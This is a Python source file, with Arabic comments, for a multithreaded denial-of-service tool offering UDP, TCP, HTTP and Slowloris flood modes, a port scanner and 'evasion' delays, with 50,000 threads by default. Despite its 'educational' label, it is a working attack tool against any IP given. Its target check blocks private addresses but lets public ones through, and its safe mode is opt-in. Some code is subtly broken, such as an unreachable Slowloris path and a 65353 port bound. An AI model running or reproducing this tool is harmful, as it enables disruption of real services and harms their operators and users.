#!/usr/bin/env python3
# Enhanced DDoS Simulation Tool with AI Features
# For Educational and Security Testing Purposes Only
# Author: AI-Assisted Development

import argparse
import random
import socket
import threading
import time
import sys
import os
from dataclasses import dataclass
from enum import Enum
from typing import List, Tuple, Optional
import ipaddress
import logging

# ==================== AI-ENHANCED FEATURES ====================

class AttackPattern(Enum):
    """أنماط الهجوم المحاكاة بواسطة الذكاء الاصطناعي"""
    SLOW_LORIS = "slowloris"
    UDP_FLOOD = "udp_flood"
    TCP_SYN = "tcp_syn"
    HTTP_FLOOD = "http_flood"
    MIXED_STRATEGY = "mixed"
    ADAPTIVE_AI = "adaptive_ai"

@dataclass
class TargetAnalysis:
    """تحليل ذكي للهدف"""
    response_times: List[float]
    open_ports: List[int]
    is_protected: bool = False
    suggested_pattern: AttackPattern = AttackPattern.MIXED_STRATEGY

# ==================== CONFIGURATION ====================

class AIConfig:
    """تكوين محرك الذكاء الاصطناعي"""
    MAX_THREADS = 500000
    MIN_PACKET_SIZE = 2048
    MAX_PACKET_SIZE = 4096
    ADAPTIVE_RATE = True  # ضبط معدل الهجوم تلقائياً
    EVASION_TECHNIQUES = True  # تقنيات تجنب الاكتشاف
    LOG_LEVEL = logging.WARNING
    
    @staticmethod
    def validate_target(target_ip: str, target_port: int) -> bool:
        """التحقق من صحة الهدف (للاستخدام الأخلاقي)"""
        try:
            # منع استهداف عناوين IP خاصة
            ip_obj = ipaddress.ip_address(target_ip)
            if ip_obj.is_private:
                print(f"[!] Warning: {target_ip} is a private IP. Only test on authorized systems.")
                return False
            return True
        except ValueError:
            return False

# ==================== AI ATTACK ENGINE ====================

class AIAttackEngine:
    """محرك هجوم ذكي بمحاكاة السلوك البشري"""
    
    def __init__(self, target_ip: str, target_ports: Tuple[int, int]):
        self.target_ip = target_ip
        self.min_port, self.max_port = target_ports
        self.analysis = TargetAnalysis([], [])
        self.packet_counter = 0
        self.adaptive_sleep = 0.001
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
        ]
    
    def intelligent_port_scan(self, max_ports: int = 100) -> List[int]:
        """مسح ذكي للمنافذ المفتوحة"""
        open_ports = []
        common_ports = [80, 443, 22, 21, 25, 53, 8080, 8443]
        
        print("[AI] Scanning for open ports...")
        for port in common_ports[:max_ports]:
            if self._check_port(port):
                open_ports.append(port)
                print(f"[+] Port {port} is open")
        
        return open_ports
    
    def _check_port(self, port: int) -> bool:
        """فحص منفذ معين"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target_ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def generate_smart_packet(self, pattern: AttackPattern) -> bytes:
        """إنشاء حزم ذكية بناءً على نمط الهجوم"""
        if pattern == AttackPattern.HTTP_FLOOD:
            user_agent = random.choice(self.user_agents)
            http_request = f"GET /?{random.randint(1, 1000)} HTTP/1.1\r\n"
            http_request += f"Host: {self.target_ip}\r\n"
            http_request += f"User-Agent: {user_agent}\r\n"
            http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            http_request += "Accept-Language: en-US,en;q=0.5\r\n"
            http_request += "Connection: keep-alive\r\n\r\n"
            return http_request.encode()
        
        elif pattern == AttackPattern.SLOW_LORIS:
            # Slowloris attack headers
            headers = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n"
            headers += "User-Agent: Mozilla/5.0\r\n"
            headers += f"Content-Length: {random.randint(1000, 5000)}\r\n"
            return headers.encode()
        
        else:
            # Random data for UDP/TCP floods
            size = random.randint(
                AIConfig.MIN_PACKET_SIZE, 
                AIConfig.MAX_PACKET_SIZE
            )
            return random._urandom(size)
    
    def adaptive_rate_control(self, success_rate: float) -> None:
        """ضبط معدل الهجوم تلقائياً بناءً على نجاحه"""
        if success_rate > 0.08:
            # تخفيض معدل الهجوم إذا كان ناجحاً جداً (محاكاة السلوك البشري)
            self.adaptive_sleep = max(0.00001, self.adaptive_sleep * 0.9)
        else:
            # زيادة معدل الهجوم إذا لم يكن ناجحاً
            self.adaptive_sleep = min(0.0001, self.adaptive_sleep * 1.1)

# ==================== ATTACK MODULES ====================

class AttackModule:
    """وحدة هجوم أساسية مع ميزات ذكية"""
    
    def __init__(self, engine: AIAttackEngine):
        self.engine = engine
        self.running = False
        self.attack_pattern = AttackPattern.MIXED_STRATEGY
    
    def start_attack(self, pattern: AttackPattern, threads: int, duration: int = None):
        """بدء الهجوم بنمط محدد"""
        self.running = True
        self.attack_pattern = pattern
        
        print(f"[AI] Starting {pattern.value} attack on {self.engine.target_ip}")
        print(f"[AI] Using {threads} threads")
        
        # إنشاء خيوط الهجوم
        thread_pool = []
        for i in range(min(threads, AIConfig.MAX_THREADS)):
            t = threading.Thread(target=self._attack_worker, args=(i,))
            t.daemon = True
            t.start()
            thread_pool.append(t)
        
        # ضبط مدة الهجوم إذا كانت محددة
        if duration:
            print(f"[AI] Attack will run for {duration} seconds")
            time.sleep(duration)
            self.stop_attack()
        else:
            # انتظار الإشارة للإيقاف
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop_attack()
    
    def _attack_worker(self, thread_id: int):
        """عامل الهجوم في كل خيط"""
        pattern = self.attack_pattern
        
        while self.running:
            try:
                # اختيار منفذ ذكي
                if self.engine.min_port == self.engine.max_port:
                    target_port = self.engine.min_port
                else:
                    target_port = random.randint(
                        self.engine.min_port, 
                        self.engine.max_port
                    )
                
                # اختيار نمط الهجوم بشكل عشوائي في نمط MIXED
                if pattern == AttackPattern.MIXED_STRATEGY:
                    current_pattern = random.choice([
                        AttackPattern.UDP_FLOOD,
                        AttackPattern.TCP_SYN,
                        AttackPattern.HTTP_FLOOD
                    ])
                else:
                    current_pattern = pattern
                
                # تنفيذ الهجوم بناءً على النمط
                if current_pattern in [AttackPattern.UDP_FLOOD, AttackPattern.MIXED_STRATEGY]:
                    self._udp_flood(target_port)
                elif current_pattern in [AttackPattern.TCP_SYN, AttackPattern.HTTP_FLOOD]:
                    self._tcp_attack(target_port, current_pattern)
                
                # إضافة تأخير ذكي لمحاكاة السلوك البشري
                if AIConfig.EVASION_TECHNIQUES:
                    time.sleep(random.uniform(0.001, 0.01))
                
                self.engine.packet_counter += 1
                
                # تحديث العدادات كل 100 حزمة
                if self.engine.packet_counter % 100 == 0:
                    print(f"[{thread_id}] Sent {self.engine.packet_counter} packets")
                    
            except Exception as e:
                if AIConfig.LOG_LEVEL == logging.DEBUG:
                    print(f"[Thread {thread_id}] Error: {e}")
    
    def _udp_flood(self, target_port: int):
        """هجوم UDP مع حزم ذكية"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = self.engine.generate_smart_packet(self.attack_pattern)
        
        for _ in range(random.randint(10, 100)):  # عدد متغير من الحزم
            try:
                sock.sendto(packet, (self.engine.target_ip, target_port))
                if AIConfig.EVASION_TECHNIQUES:
                    # تغيير حجم الحزمة بشكل عشوائي
                    packet = random._urandom(random.randint(64, 1024))
            except:
                break
        
        sock.close()
    
    def _tcp_attack(self, target_port: int, pattern: AttackPattern):
        """هجوم TCP بأنماط مختلفة"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            if pattern == AttackPattern.SLOW_LORIS:
                # Slowloris: فتح اتصالات وإبقاؤها مفتوحة
                sock.connect((self.engine.target_ip, target_port))
                sock.send(self.engine.generate_smart_packet(pattern))
                # إبقاء الاتصال مفتوحاً
                time.sleep(random.randint(10, 30))
            else:
                # هجوم TCP عادي
                sock.connect((self.engine.target_ip, target_port))
                for _ in range(random.randint(1, 50)):
                    sock.send(self.engine.generate_smart_packet(pattern))
            
            sock.close()
        except:
            pass
    
    def stop_attack(self):
        """إيقاف الهجوم"""
        self.running = False
        print("[AI] Attack stopped")

# ==================== MAIN EXECUTION ====================

def parse_port(port_str: str) -> Tuple[int, int]:
    """تحليل وسيطة المنفذ"""
    if port_str == "0":
        return (1, 65353)
    elif "-" in port_str:
        try:
            min_port, max_port = map(int, port_str.split("-"))
            return (min_port, max_port)
        except:
            return (1, 65353)
    else:
        try:
            port = int(port_str)
            return (port, port)
        except:
            return (80, 80)  # افتراضياً منفذ HTTP

def main():
    """الدالة الرئيسية"""
    parser = argparse.ArgumentParser(description="AI-Enhanced Security Testing Tool")
    parser.add_argument("-i", "--ip", required=True, type=str, help="Target IP")
    parser.add_argument("-p", "--port", type=str, default="80", 
                       help="Port(s) (e.g., 80, 1-100, or 0 for all)")
    parser.add_argument("-m", "--mode", type=str, default="mixed",
                       choices=[p.value for p in AttackPattern],
                       help="Attack mode")
    parser.add_argument("-t", "--threads", type=int, default=50000,
                       help="Number of threads")
    parser.add_argument("-d", "--duration", type=int, default=None,
                       help="Attack duration in seconds (optional)")
    parser.add_argument("-s", "--scan", action="store_true",
                       help="Perform intelligent port scan before attack")
    parser.add_argument("--safe", action="store_true",
                       help="Safe mode for local testing only")
    
    args = parser.parse_args()
    
    # عرض تحذير أخلاقي
    print("=" * 60)
    print("AI-ENHANCED SECURITY TESTING TOOL")
    print("For Authorized Educational and Testing Purposes Only")
    print("=" * 60)
    
    # التحقق من وضع الأمان
    if args.safe:
        print("[SAFE MODE] Only localhost testing allowed")
        if args.ip != "127.0.0.1":
            print("[!] Changing target to localhost for safe mode")
            args.ip = "127.0.0.1"
    
    # التحقق من الهدف
    if not AIConfig.validate_target(args.ip, 80):
        print(f"[!] Warning: Target {args.ip} may be inappropriate")
        response = input("[?] Continue anyway? (y/N): ")
        if response.lower() != 'y':
            print("[*] Exiting...")
            return
    
    # تحليل المنافذ
    target_ports = parse_port(args.port)
    print(f"[*] Target: {args.ip}:{target_ports[0]}-{target_ports[1]}")
    
    # إنشاء محرك الذكاء الاصطناعي
    engine = AIAttackEngine(args.ip, target_ports)
    
    # مسح المنافذ إذا طلب
    if args.scan:
        open_ports = engine.intelligent_port_scan()
        if open_ports:
            print(f"[AI] Found {len(open_ports)} open ports")
            # ضبط منافذ الهدف على المفتوحة منها
            target_ports = (min(open_ports), max(open_ports))
            engine.min_port, engine.max_port = target_ports
    
    # إنشاء وحدة الهجوم
    attack_module = AttackModule(engine)
    
    # تحديد نمط الهجوم
    try:
        pattern = AttackPattern(args.mode)
    except:
        pattern = AttackPattern.MIXED_STRATEGY
    
    # بدء الهجوم
    try:
        attack_module.start_attack(pattern, args.threads, args.duration)
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    finally:
        attack_module.stop_attack()
        
        # إحصائيات نهائية
        print("\n" + "=" * 60)
        print("ATTACK SUMMARY")
        print(f"Target: {args.ip}")
        print(f"Ports: {target_ports[0]}-{target_ports[1]}")
        print(f"Mode: {pattern.value}")
        print(f"Threads: {args.threads}")
        print(f"Total packets: {engine.packet_counter}")
        print("=" * 60)

if __name__ == "__main__":
    # ضبط مستوى التسجيل
    logging.basicConfig(level=AIConfig.LOG_LEVEL)
    
    # التحقق من صلاحيات المستخدم
    if os.name == 'posix' and os.geteuid() != 0:
        print("[!] Warning: Running without root privileges may limit performance")
    
    main()
